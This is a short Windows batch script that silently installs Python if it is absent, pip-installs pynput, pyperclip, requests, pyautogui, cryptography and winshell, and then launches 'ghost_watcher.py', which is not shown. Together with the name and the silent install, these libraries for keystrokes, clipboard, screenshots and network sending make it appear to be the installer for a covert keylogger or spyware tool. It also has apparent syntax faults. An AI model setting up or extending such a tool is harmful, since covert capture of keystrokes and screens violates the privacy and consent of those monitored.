@echo off
:: Check if Python is installed
where python >nul 2>&1
if %errorlevel% equ 0(
	echo Python is already installed.
) else(
	echo Python is not installed. Installing Python...
	:: Download Python installer
	curl -o python_installer.exe https://www.python.org/ftp/python/3.13.2/python-3.13.2-amd64.exe
	:: Install Python silently
	start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
	:: Clean up the installer
	del python_installer.exe
	echo Python installed successfully.
)

:: Install required Python libraries
pip install pynput pyperclip requests pyautogui cryptography winshell platform

:: Run the Python script
python ghost_watcher.py